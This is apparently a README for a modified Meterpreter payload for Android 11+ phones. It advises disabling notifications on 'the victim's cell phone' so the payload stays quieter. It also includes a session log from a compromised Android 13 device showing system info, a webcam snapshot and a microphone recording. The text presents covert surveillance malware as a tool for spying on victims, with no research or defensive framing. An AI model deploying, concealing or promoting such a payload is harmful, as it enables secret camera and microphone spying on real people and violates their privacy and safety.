# Meterpreter-Android
Meterpreter payload modified for Android, make it compatible with Android 11+, functions such as camera preview and microphone recording are working properly.

I recommend that after installing the payload on the victim's cell phone, disable the app's notification permission, to make the payload quieter.
```
meterpreter > sysinfo
Computer        : localhost
OS              : Android 13 - Linux 4.19.191-perf-g3c7e48ca8847 (aarch64)
Architecture    : aarch64
System Language : pt_BR
Meterpreter     : dalvik/android
meterpreter > webcam_snap -i 2
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/android/bOjFlXzC.jpeg
meterpreter > record_mic -d 5
[*] Starting...
[*] Stopped
Audio saved to: /root/android/TLbcSexf.wav
meterpreter >
```
